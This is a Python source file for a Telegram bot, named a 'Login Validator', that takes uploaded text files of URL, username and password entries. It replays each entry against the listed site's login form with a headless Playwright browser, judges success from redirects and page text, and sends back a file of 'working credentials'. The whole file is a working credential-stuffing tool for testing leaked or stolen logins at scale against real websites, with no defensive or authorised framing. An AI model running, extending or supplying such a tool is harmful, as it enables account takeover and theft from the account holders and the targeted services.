#!/usr/bin/env python3
"""
validatorv2.py - Telegram Bot Login Validator
Accepts up to 5 txt files via Telegram, scans credentials, sends back working ones.
Format: URL|username:password or URL:username:password
"""

import os
import sys
import asyncio
import re
import tempfile
import logging
from datetime import datetime
from collections import defaultdict
from typing import List, Tuple, Optional

from playwright.async_api import async_playwright, Page

# python-telegram-bot imports
try:
    from telegram import Update, Bot
    from telegram.ext import (
        Application,
        CommandHandler,
        MessageHandler,
        ConversationHandler,
        ContextTypes,
        filters
    )
except ImportError:
    print("[!] python-telegram-bot required. Run: pip3 install python-telegram-bot")
    sys.exit(1)

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Bot states
WAITING_FOR_FILES = 1
MAX_FILES = 5

# Store user sessions
user_sessions = {}


def _parse_line(raw: str) -> Tuple[str, str, str] | None:
    """Parse URL|username|password or URL:username:password format."""
    line = raw.strip().lstrip('\ufeff')
    
    def ensure_scheme(url: str) -> str:
        if not url.lower().startswith(('http://', 'https://')):
            return 'https://' + url
        return url
    
    # Pipe format: URL|username|password
    if '|' in line:
        parts = line.split('|')
        if len(parts) >= 3:
            url = parts[0].strip()
            username = parts[1].strip()
            password = '|'.join(parts[2:]).strip()
            url = ensure_scheme(url)
            return url, username, password
    
    # Colon format: URL:username:password
    parts = line.split(":")
    if len(parts) < 3:
        return None
    
    scheme = parts[0].lower()
    
    if scheme in ("http", "https"):
        if len(parts) < 4:
            return None
        url_parts = [parts[0], parts[1]]
        i = 2
        while i < len(parts) and "/" in parts[i]:
            url_parts.append(parts[i])
            i += 1
        if i >= len(parts):
            return None
        url = ":".join(url_parts)
        username = parts[i]
        i += 1
        if i >= len(parts):
            return None
        password = ":".join(parts[i:])
        return url, username, password
    else:
        if len(parts) < 3:
            return None
        url = ensure_scheme(":".join(parts[:-2]))
        username = parts[-2]
        password = parts[-1]
        return url, username, password


def read_entries(filepath: str) -> List[Tuple[str, str, str]]:
    """Read credentials from file."""
    entries = []
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as fh:
            for raw in fh:
                line = raw.strip()
                if not line or line.startswith("#"):
                    continue
                parsed = _parse_line(line)
                if parsed:
                    entries.append(parsed)
    except Exception as e:
        logger.error(f"Error reading file: {e}")
    return entries


def _is_valid_email_format(email: str) -> bool:
    if not email or '@' not in email:
        return False
    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, email))


def _is_login_blocked_by_validation(page, email_value: str) -> bool:
    """Check if browser validation blocks login."""
    return page.evaluate('''
    () => {
        const emailInputs = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="user"], input[id*="email"], input[id*="user"]');
        for (const input of emailInputs) {
            if (!input.offsetParent) continue;
            if (input.validationMessage && input.validationMessage.length > 0) {
                const msg = input.validationMessage.toLowerCase();
                if (msg.includes('@') || msg.includes('email') || msg.includes('valid') || msg.includes('include') || msg.includes('format')) {
                    return true;
                }
            }
            if (input.matches(':invalid')) {
                const type = input.type || input.getAttribute('type');
                if (type === 'email') return true;
            }
            if (input.hasAttribute('aria-invalid') && input.getAttribute('aria-invalid') === 'true') {
                return true;
            }
        }
        return false;
    }
    ''')


async def play_login(page: Page, url: str, username: str, password: str) -> bool:
    """Try to login. Returns True if successful."""
    # Pre-validate email format
    if not _is_valid_email_format(username):
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=15000)
        except:
            return False
        await page.wait_for_timeout(500)
        
        email_inputs = await page.locator('input[type="email"], input[name*="email"]').all()
        if email_inputs:
            return False
    
    # Navigate
    try:
        await page.goto(url, wait_until="domcontentloaded", timeout=15000)
    except:
        return False
    
    await page.wait_for_timeout(1000)
    
    # Find inputs
    email_input = None
    pass_input = None
    
    try:
        email_input = page.locator("input[type='email']").first
        if not await email_input.is_visible():
            email_input = None
    except:
        pass
    
    if not email_input:
        try:
            email_input = page.locator("input[name*='email'], input[id*='email']").first
            if not await email_input.is_visible():
                email_input = None
        except:
            pass
    
    try:
        pass_input = page.locator("input[type='password']").first
        if not await pass_input.is_visible():
            pass_input = None
    except:
        pass
    
    if not email_input or not pass_input:
        inputs = await page.locator("input:visible").all()
        for inp in inputs:
            itype = await inp.get_attribute("type")
            iname = (await inp.get_attribute("name") or "").lower()
            iid = (await inp.get_attribute("id") or "").lower()
            pholder = (await inp.get_attribute("placeholder") or "").lower()
            sig = f"{itype} {iname} {iid} {pholder}"
            
            if "search" in sig or "q" == iname or iid == "q":
                continue
            
            if itype == "password":
                pass_input = inp
            elif itype == "email" or ("email" in sig and "user" in sig):
                if not email_input:
                    email_input = inp
            elif itype in ("text", "") and not email_input:
                if any(x in sig for x in ["user", "email", "log", "name", "id"]):
                    email_input = inp
    
    if not email_input or not pass_input:
        return False
    
    # Fill credentials
    try:
        await email_input.fill(username)
        await pass_input.fill(password)
    except:
        return False
    
    # Track auth responses
    auth_error = False
    auth_called = False
    
    async def on_response(response):
        nonlocal auth_error, auth_called
        if response.request.method in ("POST", "PUT"):
            rurl = response.url.lower()
            if any(x in rurl for x in ["login", "auth", "signin", "token", "authenticate"]):
                auth_called = True
                if response.status >= 400:
                    auth_error = True
    
    page.on("response", on_response)
    
    # Click submit
    submit = None
    try:
        submit = page.locator("button:has-text('Sign In')").first
        if not await submit.is_visible():
            submit = None
    except:
        pass
    
    if not submit:
        for btn_text in ["Login", "Log In", "Submit", "Continue"]:
            try:
                submit = page.locator(f"button:has-text('{btn_text}')").first
                if submit and await submit.is_visible():
                    break
                submit = None
            except:
                pass
    
    if not submit:
        buttons = await page.locator("button:visible, input[type='submit']:visible").all()
        for btn in buttons:
            txt = ((await btn.inner_text()) or "").lower() + ((await btn.get_attribute("value")) or "").lower()
            if any(w in txt for w in ["log", "sign", "submit", "enter"]):
                submit = btn
                break
        if not submit and buttons:
            submit = buttons[0]
    
    try:
        if submit:
            await submit.click(timeout=5000)
        else:
            await pass_input.press("Enter")
    except:
        page.remove_listener("response", on_response)
        return False
    
    try:
        await page.wait_for_load_state("networkidle", timeout=4000)
    except:
        await page.wait_for_timeout(3000)
    
    await page.wait_for_timeout(3000)
    page.remove_listener("response", on_response)
    
    # Decision logic
    curr = page.url.split('?')[0].rstrip('/').lower()
    orig = url.split('?')[0].rstrip('/').lower()
    
    # Check if password still filled
    try:
        password_still_filled = False
        pass_inputs = page.locator("input[type='password']")
        count = await pass_inputs.count()
        for i in range(count):
            pf = pass_inputs.nth(i)
            if await pf.is_visible():
                try:
                    val = await pf.input_value()
                    if val == password and len(password) > 0:
                        password_still_filled = True
                        break
                except:
                    pass
        if password_still_filled:
            return False
    except:
        pass
    
    if auth_called and auth_error:
        return False
    
    if await _is_login_blocked_by_validation(page, username):
        return False
    
    # Check for errors
    error_keywords = ["invalid", "incorrect", "wrong", "failed", "error", "unauthorized",
                     "denied", "bad credentials", "does not match", "not found", "try again",
                     "valid email", "email format", "missing", "proper"]
    
    body = (await page.inner_text("body")).lower()
    
    error_selectors = [
        "[role='alert']", ".error", ".alert-danger", ".invalid-feedback", ".field-error", ".help-block",
        ".toast", ".notification", ".message", ".flash-message", ".alert", ".banner", ".snackbar",
        ".toast-error", ".alert-error", ".message-error", ".form-error", ".login-error",
        "[class*='error']", "[class*='toast']", "[class*='alert']", "[class*='message']"
    ]
    
    for selector in error_selectors:
        try:
            els = page.locator(selector)
            count = await els.count()
            for i in range(count):
                el = els.nth(i)
                if await el.is_visible():
                    txt = (await el.inner_text()).lower()
                    if any(kw in txt for kw in error_keywords):
                        return False
        except:
            pass
    
    if "invalid email or password" in body or "invalid email" in body or "wrong password" in body:
        return False
    
    if any(x in curr for x in ["login", "signin", "auth"]):
        if any(kw in body for kw in error_keywords):
            return False
    
    if curr != orig and not any(x in curr for x in ["login", "signin", "auth", "account/login"]):
        return True
    
    success_words = ["dashboard", "my account", "logout", "sign out", "profile"]
    if '@' in username:
        success_words.append(f"hi {username.split('@')[0].lower()}")
    
    if curr != orig:
        if any(w and w in body for w in success_words):
            return True
    
    if curr == orig:
        return False
    
    return True


async def validate_credentials(entries: List[Tuple[str, str, str]], progress_callback=None) -> List[str]:
    """Validate all credentials and return successful ones."""
    successful = []
    
    # Group by URL
    grouped = defaultdict(list)
    for url, user, passwd in entries:
        grouped[url].append((user, passwd))
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36",
            ignore_https_errors=True
        )
        
        total_urls = len(grouped)
        url_idx = 0
        
        for url, creds in grouped.items():
            url_idx += 1
            
            if progress_callback:
                await progress_callback(f"🔍 Testing {url}\n📊 Progress: {url_idx}/{total_urls} URLs\n👤 {len(creds)} credentials to test")
            
            page = await context.new_page()
            
            for idx, (user, passwd) in enumerate(creds, 1):
                label = f"[{idx}/{len(creds)}]"
                
                if progress_callback:
                    await progress_callback(f"🔍 Testing {url}\n📊 {label} {user}...")
                
                try:
                    result = await play_login(page, url, user, passwd)
                    
                    if result:
                        line = f"{url}|{user}|{passwd}"
                        successful.append(line)
                        logger.info(f"✓ SUCCESS: {user}")
                        if progress_callback:
                            await progress_callback(f"✅ SUCCESS: {user} on {url}")
                        await page.close()
                        page = await context.new_page()
                    else:
                        logger.info(f"✗ failed: {user}")
                        await context.clear_cookies()
                except Exception as e:
                    logger.error(f"Error testing {user}: {e}")
                    await context.clear_cookies()
            
            await page.close()
        
        await browser.close()
    
    return successful


# Telegram Bot Handlers

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command handler."""
    welcome_message = """
🤖 *Welcome to Login Validator Bot!*

Send me up to *5 text files* containing login credentials.

*Supported formats:*
• `URL|username|password`
• `URL:username:password`

I'll test each credential and send you back the working ones!

*Commands:*
/start - Show this message
/clear - Clear uploaded files
/scan - Start scanning with uploaded files
/cancel - Cancel current operation

Send your files now 👇
"""
    await update.message.reply_text(welcome_message, parse_mode='Markdown')
    return WAITING_FOR_FILES


async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded files."""
    user_id = update.effective_user.id
    
    # Initialize session if needed
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'files': [],
            'entries': [],
            'temp_dir': tempfile.mkdtemp()
        }
    
    session = user_sessions[user_id]
    
    # Check file limit
    if len(session['files']) >= MAX_FILES:
        await update.message.reply_text(
            f"⚠️ Maximum {MAX_FILES} files allowed. Use /scan to start or /clear to reset."
        )
        return WAITING_FOR_FILES
    
    # Get file
    document = update.message.document
    
    # Check if it's a text file
    file_name = document.file_name
    if not file_name.endswith('.txt'):
        await update.message.reply_text(
            "⚠️ Please upload only `.txt` files."
        )
        return WAITING_FOR_FILES
    
    # Download file
    file = await context.bot.get_file(document.file_id)
    temp_path = os.path.join(session['temp_dir'], file_name)
    await file.download_to_drive(temp_path)
    
    # Parse entries
    entries = read_entries(temp_path)
    
    if not entries:
        await update.message.reply_text(
            f"⚠️ `{file_name}` contains no valid credentials.\n"
            "Format should be: `URL|username|password`",
            parse_mode='Markdown'
        )
        os.remove(temp_path)
        return WAITING_FOR_FILES
    
    session['files'].append({
        'name': file_name,
        'path': temp_path,
        'entries': entries
    })
    session['entries'].extend(entries)
    
    remaining = MAX_FILES - len(session['files'])
    
    await update.message.reply_text(
        f"✅ *{file_name}* uploaded\n"
        f"📊 {len(entries)} credentials loaded\n"
        f"📁 Total files: {len(session['files'])}/5\n"
        f"📊 Total credentials: {len(session['entries'])}\n\n"
        f"Send {remaining} more file(s) or use /scan to start",
        parse_mode='Markdown'
    )
    
    return WAITING_FOR_FILES


async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start scanning uploaded files."""
    user_id = update.effective_user.id
    
    if user_id not in user_sessions or not user_sessions[user_id]['entries']:
        await update.message.reply_text(
            "⚠️ No files uploaded yet. Send me text files first!"
        )
        return WAITING_FOR_FILES
    
    session = user_sessions[user_id]
    entries = session['entries']
    
    status_message = await update.message.reply_text(
        f"🚀 *Starting validation...*\n"
        f"📁 {len(session['files'])} file(s)\n"
        f"📊 {len(entries)} credentials to test\n\n"
        f"⏳ This may take a few minutes...",
        parse_mode='Markdown'
    )
    
    successful = []
    
    async def progress_callback(msg: str):
        try:
            await status_message.edit_text(
                f"🚀 *Validating...*\n\n{msg}",
                parse_mode='Markdown'
            )
        except:
            pass
    
    try:
        successful = await validate_credentials(entries, progress_callback)
        
        # Update status
        await status_message.edit_text(
            f"✅ *Scan complete!*\n"
            f"📊 Tested: {len(entries)} credentials\n"
            f"✅ Successful: {len(successful)}",
            parse_mode='Markdown'
        )
        
        # Send results
        if successful:
            # Save to temp file
            results_file = os.path.join(session['temp_dir'], 'working_credentials.txt')
            with open(results_file, 'w', encoding='utf-8') as f:
                f.write(f"# Working Credentials - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Total: {len(successful)}\n\n")
                for line in successful:
                    f.write(line + "\n")
            
            # Send file
            await update.message.reply_document(
                document=open(results_file, 'rb'),
                filename=f"working_creds_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
                caption=f"✅ *{len(successful)}* working credentials found!",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                "❌ No working credentials found in any of the files."
            )
        
    except Exception as e:
        logger.error(f"Scan error: {e}")
        await status_message.edit_text(
            f"❌ Error during validation:\n`{str(e)}`",
            parse_mode='Markdown'
        )
    
    # Clean up
    cleanup_session(user_id)
    
    return ConversationHandler.END


async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear uploaded files."""
    user_id = update.effective_user.id
    
    if user_id in user_sessions:
        cleanup_session(user_id)
    
    await update.message.reply_text(
        "🗑️ All files cleared. Send new files to start again!"
    )
    return WAITING_FOR_FILES


async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel operation."""
    user_id = update.effective_user.id
    
    if user_id in user_sessions:
        cleanup_session(user_id)
    
    await update.message.reply_text(
        "❌ Operation cancelled. Use /start to begin again."
    )
    return ConversationHandler.END


def cleanup_session(user_id: int):
    """Clean up user session."""
    if user_id in user_sessions:
        session = user_sessions[user_id]
        # Clean temp files
        if 'temp_dir' in session and os.path.exists(session['temp_dir']):
            import shutil
            shutil.rmtree(session['temp_dir'], ignore_errors=True)
        del user_sessions[user_id]


async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle plain text messages."""
    await update.message.reply_text(
        "📄 Please send credentials as a `.txt` file attachment.\n"
        "Or use /start to see help."
    )
    return WAITING_FOR_FILES


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors."""
    logger.error(f"Update {update} caused error {context.error}")


def main():
    """Main function to start the bot."""
    # Get token from environment or ask user
    token = os.environ.get('TELEGRAM_BOT_TOKEN')
    
    if not token:
        print("""
╔══════════════════════════════════════════════════════════╗
║  Telegram Bot Token Required                             ║
╠══════════════════════════════════════════════════════════╣
║  Please set your bot token:                              ║
║                                                          ║
║  export TELEGRAM_BOT_TOKEN='your_bot_token_here'        ║
║                                                          ║
║  Get your token from @BotFather on Telegram              ║
╚══════════════════════════════════════════════════════════╝
        """)
        sys.exit(1)
    
    print("""
╔══════════════════════════════════════════════════════════╗
║  Login Validator Bot v2.0                                  ║
║  Built by unknone hart                                    ║
╠══════════════════════════════════════════════════════════╣
║  Features:                                                ║
║  • Accept up to 5 text files                              ║
║  • Validate login credentials                             ║
║  • Send working credentials back as file                  ║
╚══════════════════════════════════════════════════════════╝
    """)
    
    # Build application
    application = Application.builder().token(token).build()
    
    # Conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start_command)],
        states={
            WAITING_FOR_FILES: [
                MessageHandler(filters.Document.TEXT, file_handler),
                CommandHandler('scan', scan_command),
                CommandHandler('clear', clear_command),
                MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler),
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel_command)],
    )
    
    application.add_handler(conv_handler)
    application.add_error_handler(error_handler)
    
    # Run bot
    print("🤖 Bot is starting...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
